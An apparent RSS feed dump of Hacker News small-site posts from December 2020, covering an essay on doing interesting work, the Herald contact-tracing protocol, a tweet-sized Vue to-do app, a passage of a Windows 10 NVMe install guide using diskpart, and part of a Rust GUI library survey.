<p>If you want to do interesting work, a great starting point is to work on things you find interesting. Instead of trying to optimize for what you think others are likely to find interestingâ€”chasing the market is a Sisyphean taskâ€”just keep digging deeper into what <i>you</i>&nbsp;find interesting.</p><p>That way, making your work interesting to others is simply a matter of sharing your enthusiasm. I took a geology class my freshman year of college. Itâ€™s easy to imagine how boring a class about rocks could be. But my professor <i>loved</i>&nbsp;rocks. She had contributed to the discovery of plate tectonics. She took us up into the mountains and showed us how you could decode geological layers laid bare by erosion to reveal the violence and wonder of how the Earth took shape. She could forge a path through the entire universe starting from a single grain of sand. Another professor could have taught the same curriculum to no effect. My professorâ€™s love for the material brought it to life. She used her enthusiasm to ignite our curiosity.</p><p>But working on things you find interesting is not sufficient to make your work interesting to other people. Weâ€™ve all been bored to death by experts who speak in impenetrable acronyms or super-fans who get lost in their own rabbit holes. Their individual interest in the material may be genuine, but it isnâ€™t contagious because they lack empathy. You (probably) wouldnâ€™t tell a dirty joke to your grandmother in the same way youâ€™d tell it to your best friend. Empathy is meeting people where they are so you can take them someplace new. Thatâ€™s why rock stars shout out the name of the city they happen to be performing in. Despite her academic fame and scientific expertise, my geology professor didnâ€™t get stuck in solipsistic obsession. Instead, she <i>used</i>&nbsp;her enthusiasm as a tool to inspire her students, to pry open new worlds for us. As a result, we found her work tremendously interesting.</p><p>So doing interesting work doesnâ€™t require guessing what others might like or a benevolent hiring manager offering you your dream job. Doing interesting work requires working on things you find interesting, and then cultivating sufficient empathy to find effective ways to share your enthusiasm with the right people. Empathy is the catalyst that makes curiosity contagious. Youâ€™ll know youâ€™re doing it right when the people you seek to reach find your work at least as interesting as you do.</p><p>*</p><p>Complement with <a href="https://www.eliotpeper.com/2020/12/quantity-is-route-to-quality-not-its.html">Quantity is a route to quality, not its opposite</a>, <a href="https://www.eliotpeper.com/2020/10/lasting-value.html">Lasting value</a>, and <a href="https://www.eliotpeper.com/2020/07/creativity-is-choice.html">Creativity is a choice.</a></p><p><b>Get new posts delivered straight to your inbox:</b></p><!--Begin MailChimp Signup Form-->




<p><a href="https://www.eliotpeper.com/p/about.html">Eliot Peper</a>&nbsp;is the author of <a href="https://www.eliotpeper.com/p/blog-page.html">nine novels</a>, including <i><a href="https://www.amazon.com/gp/product/B01E4L5L6S/ref=as_li_qf_sp_asin_il_tl?ie=UTF8&amp;tag=eliotpeper-20&amp;camp=1789&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=B01E4L5L6S&amp;linkId=cabf238d0378965558ee1c5666331431">Cumulus</a></i>, <i><a href="https://www.amazon.com/gp/product/B075CLV95J/ref=as_li_qf_sp_asin_il_tl?ie=UTF8&amp;tag=eliotpeper-20&amp;camp=1789&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=B075CLV95J&amp;linkId=56525ceda172bdcc3306737eea07155b">Bandwidth</a></i>, and, most recently, <i><a href="https://www.amazon.com/gp/product/B085PSTJNC/ref=as_li_qf_asin_il_tl?ie=UTF8&amp;tag=eliotpeper-20&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=B085PSTJNC&amp;linkId=53ae2de44bd14f1b5b598c595ba676b0">Veil</a></i>. He sends <a href="https://www.eliotpeper.com/p/inner-circle.html">a monthly newsletter</a>&nbsp;documenting his journey as a reader and writer, <a href="https://twitter.com/eliotpeper" target="_blank">tweets</a> more than he probably should,&nbsp;and lives in Oakland, CA.</p>
</div></div>]]>
            </description>
            <link>https://www.eliotpeper.com/2020/12/how-to-do-interesting-work.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25492561</guid>
            <pubDate>Mon, 21 Dec 2020 06:18:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Herald â€“ Bluetooth contact tracing protocol]]>
            </title>
            <description>
<![CDATA[
Score 54 | Comments 26 (<a href="https://news.ycombinator.com/item?id=25492423">thread link</a>) | @npad
<br/>
December 20, 2020 | https://vmware.github.io/herald/ | <a href="https://web.archive.org/web/*/https://vmware.github.io/herald/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div>
      
      <div>
  <div>
    <div>
      <div>
        
        <p>Herald provides reliable Bluetooth communication and range finding across a wide range of mobile devices, allowing Contact Tracing and other applications to have regular and accurate information to make them highly effective.</p>        
      </div>
      
    </div>
  </div>
</div> <!-- /home-hero -->



<!--
<div class="section pb-0">
    <div class="section-content">
      <div class="row">
        <div class="col">
          <h2 class="text-center"></h2>
          <p></p>
  
          <ul>
            
          </ul>
        </div>
      </div>
    </div>
  </div>
--> 

<div>
  <div>
    <div>
      <p>
        <h2>Herald solves risk estimation problems</h2>
      </p>          
    </div>
    <p><img src="https://vmware.github.io/herald/images/EstimationBenefits.png" alt="Herald estimation benefits">
  </p></div>
</div>

<div>
  <div>
    
    
    
<div>
  
    <div>
      
      <div>
        <div>
          
          <h5>Detect nearby phones</h5>
          
          
<p>100% detection of phones in the foreground and background across iOS and Android devices. <a href="https://vmware.github.io/herald/efficacy/herald">Herald supports</a>) 100% of the phones in the UK that support advertising, as well as the 35% of Android phones (<a href="https://vmware.github.io/herald/efficacy/statistics">~14% of all phones overall</a>) that cannot act as â€˜advertisersâ€™ and so remain unseen by advertising-only based protocols.</p>

          
        </div>
      </div>
    </div>
    
  
    <div>
      
      <div>
        <div>
          
          <h5>Provide regular distance readings</h5>
          
          
<p>Herald performs distance estimations every few seconds, with higher frequency on modern phones. This allows for a more accurate data and risk picture over time. Maximum frequency can be configured to optimise battery use. At <a href="https://vmware.github.io/herald/efficacy/herald">~4s per reading battery use is 6-11% over 8 hours</a>), depending on the age of the phone and its battery capacity.</p>

          
        </div>
      </div>
    </div>
    
  
    <div>
      
      <div>
        <div>
          
          <h5>Interoperate internationally</h5>
          
          
<p>By providing a common packet header we allow for <a href="https://vmware.github.io/herald/payload/interop">international interoperability</a> amongst all contact tracing applications, whether designed for centralised or decentralised contact matching and risk scoring.</p>

          
        </div>
      </div>
    </div>
    
        
</div>

  </div>
</div>

<div>
  <div>
    
    
    <div>

    
        
        


    <div>
    <div>
        <div>
            <p><img src="https://vmware.github.io/herald/img/herald.png" alt="New guides added to website">
                
            </p>
            <article>
                <h5>
                    <a href="https://vmware.github.io/herald/blog/guides">New guides added to website</a>
                </h5>
                <p>
                    Weâ€™ve been busy getting ready for the upcoming V1.1 release. For this release weâ€™ve dramatically changed
our documentation on this website.


                </p>
            </article>
        </div>
    </div>
</div>
        
        


    <div>
    <div>
        <div>
            <p><img src="https://vmware.github.io/herald/img/herald.png" alt="New logo and website">
                
            </p>
            <article>
                <h5>
                    <a href="https://vmware.github.io/herald/blog/website">New logo and website</a>
                </h5>
                <p>
                    Quite a few things have happened in the first month since Herald was published as Open Source Software
under the MIT license. [29 Nov 2020 NOTE: Code now under the Apache-2.0 license]


                </p>
            </article>
        </div>
    </div>
</div>
        
         
</div>
    
  </div>
</div>


<div>
  <div>
    
<p>
A lot of work has gone in to mobile app based contact tracing protocol 
research, design, testing and collaboration worldwide. We'd like to thank 
all of those in VMware Pivotal Labs and elsewhere worldwide that have 
assisted with various national and state governments to use mobile contact 
tracing to help save lives. â¤ï¸
</p>
  </div>
</div>

<div>
  <div>
    
<p>

All Herald works are Copyright 2020 Herald Authors.
</p>
<p>
The code for Herald (Android, iOS, Analysis Scripts, Calibration tool) are Apache-2.0 licensed. The documentation for Herald, including this website, are under the Creative Commons Attribution 4.0 International Public License.
</p>
<p>
See LICENSE.txt and NOTICE.txt for details.
</p>
  </div>
</div>


<div>
  <div>
    
<div>
  <div>
    <p>Herald Project is released as open source software and provides community support through our GitHub project page.
        If you encounter an issue or have a question, feel free to reach out on the <strong><a href="https://vmware.github.io/herald/issues">GitHub issues page for Herald Project</a></strong>.</p>
    <p>The Herald project team welcomes contributions from the community â€” please see our <strong><a href="https://github.com/vmware/herald/blob/master/contributing.md">contributing documentation</a></strong>.</p>
  </div>
</div>



  </div>
</div>
      <div>
    <div>
        <div>
            <div>
                <h5>Getting Started</h5>
                <p>To help you get started, see the documentation.</p>
            </div>
            
        </div>
    </div>
</div>




<!-- JS -->







    </div>
  </div></div>]]>
            </description>
            <link>https://vmware.github.io/herald/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25492423</guid>
            <pubDate>Mon, 21 Dec 2020 05:44:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: A TO-DO app that fits inside a single tweet]]>
            </title>
            <description>
<![CDATA[
Score 50 | Comments 52 (<a href="https://news.ycombinator.com/item?id=25492302">thread link</a>) | @rukshn
<br/>
December 20, 2020 | https://ruky.me/2020/12/21/a-to-do-app-that-fits-in-a-single-tweet/ | <a href="https://web.archive.org/web/*/https://ruky.me/2020/12/21/a-to-do-app-that-fits-in-a-single-tweet/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>Sunday morning while I was scrolling through my Twitter feed one tweet caught my eye,</p>
<blockquote data-width="500" data-dnt="true"><div lang="en" dir="ltr"><p><a href="https://twitter.com/hashtag/JavaScript?src=hash&amp;ref_src=twsrc%5Etfw">#JavaScript</a> Challenge:</p><p>Can you make a TO-DO app within a single Tweet? (280 chars)</p><p>The app should be able to add tasks, strike-through finished tasks &amp; clear all tasks.</p><p>Any general-purpose library is allowed.<br>Starting HTML body should be empty except the &lt;script&gt;.<a href="https://twitter.com/hashtag/JS?src=hash&amp;ref_src=twsrc%5Etfw">#JS</a> <a href="https://twitter.com/hashtag/code?src=hash&amp;ref_src=twsrc%5Etfw">#code</a></p></div>â€” Dumi (@dumindaxsb) <a href="https://twitter.com/dumindaxsb/status/1340539549890404354?ref_src=twsrc%5Etfw">December 20, 2020</a></blockquote>
<p>The challenge was to make a todo app that fits in a single tweet, just like any other todo app, you should be able to add or remove tasks and clear the task list. I thought how hard this can get, I thought to myself this is doable just by using plain JavaScript.</p>
<p>So since I donâ€™t have a laptop, what resulted was a whole day of torture having to code though my iPad on codepen.</p>
<h2><strong>Plain JavaScript</strong> </h2>
<p>Soon after I started using plain JavaScript it became obvious that I was not able to make it within one tweet, the DOM manipulation was taking too much characters<em>, document.createElements, document.getElements. </em></p>
<p>It was obvious that was not the right approach.</p>
<h2>Using vue</h2>
<p>Vue framework wonâ€™t require any build tools, so I donâ€™t have to go through setting up Webpack,</p>
<p>Also I can easily create the DOM within the script tag using simple HTML. So that will save some characters for me in DOM manipulation.</p>
<p>The first version I made use the <em>method</em> option in Vue app to handle button clicks, the button click event will call the function in methods to add new tasks and clear the task list.</p>
<p>However, I was unable to reduce it to one tweet. Then I went back to in-line functions, the same methods were added to button click events inline and not within the <em>methods</em> section.</p>
<p>Also I had to change buttons to anchor tags, in order to save some characters, and I had to use emojis instead of button text to save some more characters.</p>
<p>I also had to drop few buttons like a button to add a task, and instead I had to go with pressing enter key to add a task instead.</p>
<p>So I made the final version, the JavaScript code looked like this, </p>
<p data-height="300" data-theme-id="dark" data-default-tab="js" data-user="rukshn" data-slug-hash="qBaXmpE" data-pen-title="qBaXmpE">
<span>See the Pen <a href="https://codepen.io/rukshn/pen/qBaXmpE">
qBaXmpE</a> by Rukshan Ranatunge (<a href="https://codepen.io/rukshn">@rukshn</a>)
on <a href="https://codepen.io/">CodePen</a>.</span>
</p>

<p>Then I ran the code through an online JavaScript minifier and then the whole HTML though an HTML minifier, and ended up with this piece of code,</p>
<pre><code>&lt;body&gt;&lt;script src=https://unpkg.com/<a href="https://ruky.me/cdn-cgi/l/email-protection" data-cfemail="11676474517f746965">[email&nbsp;protected]</a>&gt;&lt;/script&gt;&lt;script&gt;var x={data:()=&gt;({t:[],k:""}),template:'&lt;input @keyup.enter="t.push(k)" v-model="k"&gt;&lt;a @click="t=[]"&gt;â&lt;/a&gt;&lt;p v-for="(v,i) in t"&gt;&lt;a @click="t.splice(i,1)"&gt;ğŸ…¾ï¸&lt;/a&gt;{{v}}&lt;/p&gt;'};Vue.createApp(x).mount("body")&lt;/script&gt;</code></pre>
<p>With my fingers crossed, I copied the code on to Twitter, and guess what it fits perfectly inside a single Tweet.</p>
<blockquote data-width="500" data-dnt="true"><p lang="en" dir="ltr">&lt;body&gt;&lt;script src=<a href="https://t.co/FY9eWOxLgZ">https://t.co/FY9eWOxLgZ</a>&gt;&lt;/script&gt;&lt;script&gt;var x={data:()=&gt;({t:[],k:""}),template:'&lt;input <a href="https://twitter.com/keyup?ref_src=twsrc%5Etfw">@keyup</a>.enter="t.push(k)" v-model="k"&gt;&lt;a <a href="https://twitter.com/Click?ref_src=twsrc%5Etfw">@click</a>="t=[]"&gt;â&lt;/a&gt;&lt;p v-for="(v,i) in t"&gt;&lt;a <a href="https://twitter.com/Click?ref_src=twsrc%5Etfw">@click</a>="t.splice(i,1)"&gt;ğŸ…¾ï¸&lt;/a&gt;{{v}}&lt;/p&gt;'};Vue.createApp(x).mount("body")&lt;/script&gt;</p>â€” Rukshan (@JustRuky) <a href="https://twitter.com/JustRuky/status/1340862545322762240?ref_src=twsrc%5Etfw">December 21, 2020</a></blockquote>
<p>And here is the code in action, <a href="https://jsbin.com/venihiliha/1/edit?html,output">link</a> </p>
<p data-height="265" data-theme-id="dark" data-default-tab="result" data-user="rukshn" data-slug-hash="qBaXmpE" data-pen-title="qBaXmpE">
<span>See the Pen <a href="https://codepen.io/rukshn/pen/qBaXmpE">
qBaXmpE</a> by Rukshan Ranatunge (<a href="https://codepen.io/rukshn">@rukshn</a>)
on <a href="https://codepen.io/">CodePen</a>.</span>
</p>

<h2>What I failed to achieve </h2>
<p>The original Tweet says, that the completed tasks should have a strike through.</p>
<p>But because css was costing me too much characters I had to fall back to remove completed tasks instead, but Iâ€™m sure someone will figure a solution for that as well.</p>
<p>At the same time, I think you can save even more characters by using <a href="https://mithril.js.org/">mithril</a>, because you have short-codes for DOM elements as well, but I havenâ€™t tried mithril in awhile.</p>
<h4>One last thing</h4>
<p>No I didnâ€™t waste my whole Sunday on this problem, but I had to spend few hours, thinking and trying different versions. </p>
<p>I would have cut back some more time if I had a laptop. Somerimes I feel like buying an old laptop and refurbishing it and installing Ubuntu on it.</p>
<p>Sunday well spent? Absolutely yes.</p>
<h2>Best answer?</h2>
<p>One thing I love about HN is the fact that there are lot of bright minds out there. Since I posted this on HN I knew it was just a matter of time since someone figures this out.</p>
<p>I guess this is the best answer and also ticks all the boxes, well done.</p>
<pre><code> &lt;script&gt;document.write(`&lt;style&gt;:checked+*{text-decoration:line-through}#t{display:none}&lt;/style&gt;&lt;p id="t"&gt;&lt;input type="checkbox"&gt;&lt;input&gt;&lt;div id="f"&gt;&lt;/div&gt;&lt;p&gt;&lt;button onclick="f.appendChild(t.cloneNode(true)).id=''"&gt;+&lt;/button&gt;&lt;button onclick="f.innerHTML=''"&gt;Ã—&lt;/button&gt;`)&lt;/script&gt;</code></pre>
<p><strong>HN link to this answer</strong>: https://news.ycombinator.com/item?id=25493533</p>
<p><strong>Original thread on HN</strong>: https://news.ycombinator.com/item?id=25492302</p>
</div></div>]]>
            </description>
            <link>https://ruky.me/2020/12/21/a-to-do-app-that-fits-in-a-single-tweet/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25492302</guid>
            <pubDate>Mon, 21 Dec 2020 05:12:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Coercing Windows 10 to install on a NVMe drive]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25492288">thread link</a>) | @pngmangi
<br/>
December 20, 2020 | https://ansonvandoren.com/posts/clean-win10-install-nvme/ | <a href="https://web.archive.org/web/*/https://ansonvandoren.com/posts/clean-win10-install-nvme/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
<p>My daily driver is a desktop that I originally built as a Hackintosh for my wife's use. She outgrew it a year
or so ago for a new iMac, and I inherited it. Over the year, I've been using macOS less and less, and have spent
much more time on the dual-booted Windows 10 installation, especially since WSL is getting better and better
all the time. It's almost not painful to use for just about all the coding, writing, and occasional photography
or design projects I undertake.</p>
<p>Two days ago, I noticed while doing some file cleanup that there really was a terrific lot of crap that had
accumulated on the Windows drive. I'm fairly certain that this drive started out as a Windows 7 install, then
probably skipped Windows 8 and has been on Windows 10 through several Insider Ring upgrades over the years.
Anyway, I thought I'd just finish my backup and then re-install Windows to have a nice clean start. At the same
time, I figured since I wasn't really using the macOS installation that much, I'd move that one to a slower SATA
SSD and move Windows over to the <a href="https://amzn.to/2KGpd3x">Western Digital 500GB NVMe M.2 drive</a> that previously
hosted the Hackintosh boot drive.</p>
<p>Based on my recollection of the last time I'd installed/updated Windows, it seemed like a reasonable afternoon
project that should be pretty straightforward. As it turns out, the actual installation of Windows 10 is even quicker
than I had remembered, but the getting to the point where installation was possible was more than I bargained for.</p>
<p>This is a write-up because I ran into a few problems that were difficult to find great answers for, and I'm sure
there's someone else out there who will get into a similar situation. That someone is most likely to be a future
version of meâ€¦</p>

<p><strong>Windows 10 install media</strong></p>
<p>This is the easy part. I remembered having had issues in the past with the <a href="https://www.microsoft.com/en-us/software-download/windows10">Windows Media Creation Tool</a>,
and so I went out of my way to download the plain old ISO.</p>
<blockquote>
<p>Pro-tip: if you want to do this you need to
<a href="https://www.howtogeek.com/427223/how-to-download-a-windows-10-iso-without-the-media-creation-tool/">spoof your User-Agent</a>
if you're on Windows.</p>
</blockquote>
<blockquote>
<p>Pro-pro-tip: you probably don't need to do this. I ended up using WMCT and had no issues.</p>
</blockquote>
<p>Anyway, if you want to get the ISO then you'll probably want something like <a href="https://rufus.ie/">Rufus</a> to help
you burn it into a USB thumb drive. As I mentioned above, during the course of about 15 installation attempts,
I ended up recreating the bootable media with WMCT and that's the version I ultimately successfully used. The
other failures weren't due to the ISO or Rufus, but it's probably easier to just use WMCT unless you have some
other burning reason not to.</p>
<p><strong>Hard drive prep</strong></p>
<p>I had already cleaned everything I needed off of the M.2 drive, and had reformatted it before leaving macOS.
The drive doesn't need to be in any particular state, format, or partitioning scheme - you can take care
of that in the Windows installer.</p>
<p>Some motherboards have little quirks about whether you can actually have more than one M.2 drive connected,
and if so, what other SATA ports you might lose access to, or which other PCIe slots get degraded lanes or
just stop working altogether. In my case, I'd already connected it up correctly several years ago and didn't
need to make any changes, but worth checking if you're using the M.2 drive for the first time.</p>
<p><strong>BIOS prep</strong></p>
<p>I'm going to skip all of the many, many things I tried that didn't work with BIOS settings for this, and
just make note of what I ended up finding was important. Obviously all BIOSs are different and so this won't
be an exact prescription unless you also happen to have a GIGABYTE GA-Z170X-UD5 on F21 BIOS version, but
it may be helpful nonetheless.</p>
<p><strong>CSM needs to be turned off.</strong> This is Compatibility Support Module, and it (possibly among other things) will
force the boot media into MBR mode, and not UEFI mode. You want UEFI mode unless your motherboard is somehow
so old that it's not enabled. But if that were the case you're probably not trying to install Windows 10 on it.</p>
<p>If you have CSM enabled, it's very likely that you'll see an error message like â€œWindows cannot be installed to this disk.
The selected disk is of the GPT partition style.â€</p>
<figure>
    <img src="https://ansonvandoren.com/images/the-selected-disk-is-of-the-gpt-partition-style.png#center" alt="This may mean you have CSM enabled"> <figcaption>
            <p>This may mean you have CSM enabled</p>
        </figcaption>
</figure>

<p>I also needed to set <strong>Secure Boot to Disabled</strong> otherwise I couldn't even get to the BIOS screenâ€¦ I needed to
hard-reset the CMOS a few times before I figured this out definitively.</p>
<p>The final setting that mattered was the <strong>â€œWindows 8/10 Featuresâ€</strong>, which needed to be set to â€œWindows 8/10â€.
The WHQL setting isn't needed, and the â€œOther OSâ€ had been my previous setting when the boot manager was
Clover from the Hackintosh EFI partition, but didn't work with a Windows EFI boot loader.</p>
<p>I also had â€œFast Bootâ€ turned off, but I don't think it should matter either way. All these settings (in my BIOS)
were under the tab labeled â€œBIOSâ€.</p>

<p>I don't know why this is a problem. Others seem to have it as well, but not consistently. I don't know if
it's related to this being a clean install with multiple internal hard drives connected, or to something
about USB 3.x vs USB 2.0 for the installer media, or maybe something entirely different. Either way, as I made
it through the initial few steps of the Windows 10 installation, I kept running into a failure with the error
message â€œWindows could not prepare the computer to boot into the next phase of installation. To install Windows,
restart the installation.â€ Of course, restarting the installation doesn't change anything.</p>
<p>Before getting to this point, I had used the partition manager in the installer to delete all partitions from
the target NVMe drive, then chose the Unallocated Space on which to install Windows. I also tried creating
the partitions manually myself, with the same error message.</p>
<p>After much swearing both at the installer and the garbage that is the Microsoft Community Forums, I finally
found my way to a gentleman who went by <a href="https://answers.microsoft.com/en-us/profile/7a26b9f6-6f40-419f-a7bd-9fc6389899c8?sort=LastReplyDate&amp;dir=Desc&amp;tab=Threads&amp;forum=allcategories&amp;meta=&amp;status=&amp;mod=&amp;advFil=&amp;postedAfter=undefined&amp;postedBefore=undefined&amp;threadType=All&amp;page=1">RichardKay1</a> and seemed
to have not only the same exact problem as I, but also a solution that <a href="https://answers.microsoft.com/en-us/windows/forum/all/windows-10-fresh-install-fails/f9614ae4-6dbd-4715-9a81-8586b16dfaf7?page=2">looked like it might have merit</a>.</p>
<p>His steps outlined on the forum were not exact, and mostly dealt with the <code>diskpart</code> utility, with which
I am not all that familiar, so I also spent some time trying to figure out how to safely use that tool
without deleting all the data on the 4 other disks that I had connected still.</p>
<blockquote>
<p>Pro-tip: probably safer to disconnect all the other disks you're not using for the actual install
before messing around with <code>diskpart</code>. Unless you're very careful. Or brave/stupid.
I decline to identify into which category I fell.</p>
</blockquote>
<blockquote>
<p>WARNING: <code>diskpart</code> can seriously ruin your day. BE CAREFUL BEFORE YOU HIT ENTER. You have been warned.</p>
</blockquote>
<p>According to Mr. RichardKay1, the root cause is that the USB installer <em>actually</em> tries to install Windows
onto the same USB stick, despite me having chosen an internal drive as the target. I don't really know how
to verify this, but regardless, his solution worked.</p>

<p>This is the key takeaway to solve the â€œWindows could not prepare the computer to boot into the next phase
of installationâ€. Or it was in my case, anyway.</p>
<p><strong>Reformat the target drive</strong></p>
<ol>
<li>Boot into the USB installer (I assume you can do this, else you probably the target audience.).</li>
<li>Select the language, time, and keyboard type, click Next.</li>
<li>Click â€œRepair your computerâ€, then â€œTroubleshootâ€, then â€œCommand Promptâ€.</li>
</ol>
<p>This puts you on the X: drive (temporary RAM disk with some command line utilities) and able to access
the rest of the connected drives. First step is to fully erase the target disk.</p>
<blockquote>
<p>NOTE: it's up to you to choose the correct disks, and make sure that erasing them is actually what you
want to do!</p>
</blockquote>
<ol start="4">
<li>From the command prompt, type <code>diskpart</code> to start the utility. You'll get a little prompt like <code>DISKPART&gt;</code>
and not much else.</li>
<li>Type <code>list disk</code> to show all disks, and identify (by size or whatever) which is your target.</li>
</ol>
<div><pre><code data-lang="cmd">DISKPART<span></span>&gt; list disk

  Disk ###  Status         Size     Free     Dyn  Gpt
  --------  -------------  -------  -------  ---  ---
  Disk 0    Online          111 GB      0 B
  Disk 1    Online          931 GB  1024 KB        *
  Disk 2    Online          465 GB  2048 KB        *
  Disk 3    Online          111 GB      0 B        *
  Disk 4    Online          111 GB      0 B        *
  Disk 5    No Media           0 B      0 B
  Disk 6    Online           14 GB      0 B

DISKPART&gt;
</code></pre></div><p>My target in this case was a 500GB disk, so here shown as Disk 2 (it's not exact).</p>
<ol start="6">
<li>Type <code>select disk 2</code> to choose this disk for manipulation.</li>
</ol>
<blockquote>
<p>WARNING: the next step will erase EVERYTHING on the disk you have selected!</p>
</blockquote>
<ol start="7">
<li>Type <code>clean</code> to erase all partitions on this disk. If you run <code>list disk</code> again after this you should
see that the value in the â€œFreeâ€ column has gone up to the full drive capacity.</li>
</ol>
<p><strong>Prep the internal drive</strong></p>
<ol start="8">
<li>We eventually want to boot in UEFI mode, and so need the partition scheme to be GPT. Type
<code>convert gpt</code> to accomplish this.</li>
</ol>
<p>This is where I diverged a bit from the forum answer. I wanted to create a EFI partition manually so that
I could keep it big enough to later use <code>grub</code> for a dual-boot Linux install, and also to get the EFI partition
in the right spot on the disk so when I collapsed partitions later I wouldn't leave a gap.</p>
<ol start="9">
<li>Create an EFI partition with <code>create partition EFI size=500</code> (size is in MB).</li>
<li>Format the EFI partition to FAT32 (important) with <code>format FS=FAT32 label=System</code>.</li>
</ol>
<p>Now that EFI was ready to go, I wanted to create a ~10GB partition to hold the install media that was currently
on the USB thumb drive. The process is similar to creating the EFI partition except that it's a â€˜primaryâ€™ partition
and formatted as NTFS:</p>
<ol start="11">
<li>Create installer partition with <code>create partition primary size=10000</code>.</li>
<li>Format installer partition with <code>format quick FS=NTFS label=Installer</code>.</li>
</ol>
<p>Next, I needed to access files on both the installer USB and also on the new internal partition. To do that
I needed to assign a drive letter.</p>
<ol start="13">
<li>To see what letters are assigned, type <code>list volume</code></li>
</ol>
<div><pre><code data-lang="cmd">DISKPART<span></span>&gt; list volume

  Volume ###  Ltr  Label        Fs     Type        Size     Status     Info
  ----------  ---  â€¦</code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ansonvandoren.com/posts/clean-win10-install-nvme/">https://ansonvandoren.com/posts/clean-win10-install-nvme/</a></em></p>]]>
            </description>
            <link>https://ansonvandoren.com/posts/clean-win10-install-nvme/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25492288</guid>
            <pubDate>Mon, 21 Dec 2020 05:09:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A survey of rust GUI libraries]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 4 (<a href="https://news.ycombinator.com/item?id=25492179">thread link</a>) | @tetraodonpuffer
<br/>
December 20, 2020 | https://www.boringcactus.com/2020/08/21/survey-of-rust-gui-libraries.html | <a href="https://web.archive.org/web/*/https://www.boringcactus.com/2020/08/21/survey-of-rust-gui-libraries.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
    <p>a popular trend in the Rust community is to ask "Are We X Yet" for various things that it would be nice to be able to develop easily in Rust - <a href="https://arewegameyet.rs/">game</a> and <a href="https://www.arewewebyet.org/">web</a> are the most prominent ones as far as i can tell - and one such question is <a href="https://areweguiyet.com/">Are We GUI Yet</a>.
that's a good question; <em>are</em> we GUI yet?
Are We GUI Yet has a list of libraries for building GUIs: let's go through them in alphabetical order and see if we can build a simple to-do list with them without too much struggle.</p>
<p>some notes before we get started.</p>
<ol>
<li>this is all extremely subjective.</li>
<li>the only ui toolkits i have used and not hated are Swing (i know), Electron (<em>i know</em>), and wxWidgets, which doesn't have Rust bindings because Rust bindings to C++ libraries are generously described as a nuisance to create (i've tried, and i'm writing this post instead of trying harder).
as such, i might be using some of these wrong, who knows.</li>
<li>i use windows, and so anything that's a nuisance to set up on windows is not going to fare well regardless of how cool it is once you get it working.
it could be the best thing since sliced bread or Meteor on release and i wouldn't care.
do not @ me.</li>
<li>the people who wrote these libraries have done more than i have to make the rust gui ecosystem not suck, and i don't want any of this to come across as suggesting that they suck and their work is bad.
the strongest thing i want to say is that a library is not designed in a way that i would want it to be designed, or that it doesn't work for me.
doing this shit at all is really goddamn difficult, and i don't want to minimize that by being unhappy with the results.</li>
<li>i started drafting this post in early July 2020, and finished it in late August 2020.
some things may have changed in the meantime while i wasn't paying attention.</li>
</ol>
<h2>azul</h2>
<p>first on our list is <a href="https://azul.rs/">azul</a>:</p>
<blockquote>
<p>A free, functional, immediate-mode GUI framework for rapid development of desktop applications written in Rust, supported by the Mozilla WebRender rendering engine.</p>
</blockquote>
<p>the wiki says we need cmake installed, which is never a good sign, but conveniently, i've already got that set up on my computer, for reasons i forget but probably didn't enjoy.
the runtime dependencies on linux are a mile long, but fortunately i don't have to care.
azul isn't currently available on crates.io for reasons that presumably exist but are difficult to explain, so we have to add it directly as a git dependency.</p>
<p>once we've got it added as a dependency, we can attempt to run our test crate, just to make sure everything's not on fire. unfortunately:</p>
<div><pre><span></span>error: failed to run custom build command for `servo-freetype-sys v4.0.5`

Caused by:
  process didn't exit successfully: `D:\Melody\Projects\we-are-not-gui-yet\target\debug\build\servo-freetype-sys-1fae054761ff82c5\build-script-build` (exit code: 101)
--- stdout
running: "cmake" &lt;snip&gt;

--- stderr
CMake Error: Could not create named generator Visual Studio 16 2019
</pre></div>
<p>this is an inauspicious beginning.
one version history crawl later and it looks like my cmake is from April 2019, which is not all that old but maybe they hadn't caught up on the latest visual studio yet, who knows.
this is already more work than i was prepared to do, but i've come this far, so it's time to update my cmake.</p>
<p>okay one installer later and it's time to try again.
armed with a cmake from May 2020, let's give this another shot:</p>
<div><pre><span></span>error[E0433]: failed to resolve: could not find `IoReader` in `bincode`
   --&gt; C:\Users\Melody\.cargo\registry\src\github.com-1ecc6299db9ec823\webrender_api-0.60.0\src\display_list.rs:270:35
    |
270 |             let reader = bincode::IoReader::new(UnsafeReader::new(&amp;mut self.data));
    |                                   ^^^^^^^^ could not find `IoReader` in `bincode`
</pre></div>
<p>welp.
the cmake update fixed things, i guess, but now we've got a whole other pile of mess.
this might be fixable, it may have been fixed by the time you read this.
regardless, this library does not work for me.</p>
<h2>conrod</h2>
<p>next up is <a href="https://github.com/pistondevelopers/conrod">conrod</a>:</p>
<blockquote>
<p>An easy-to-use, 2D GUI library written entirely in Rust.</p>
</blockquote>
<p>i've actually used this one before in a couple of projects, but it's been a minute, so i forget the details.</p>
<p>they do not have a real tutorial, which is unfortunate, but they do have some examples.
unfortunately, step one is to pick which of the half dozen backends i want.
do i want glium or vulkano or rendy or piston?
do i look like i know what a vulkano is?
i just want a picture of a <a href="https://youtu.be/EvKTOHVGNbg">god dang hot dog</a>.
okay that's not quite fair, i recognize three of those and can infer from context what the fourth one is, but that's only because i've been down this road before, and i still have no clue which one is the right one to pick.
all the examples live under glium, though, so let's go with that.</p>
<p>wait actually i'm staring at these examples and there's an entire ass event loop in the support code for the examples.
something in here mentions a <code>GliumDisplayWinitWrapper</code> and i'm scared.
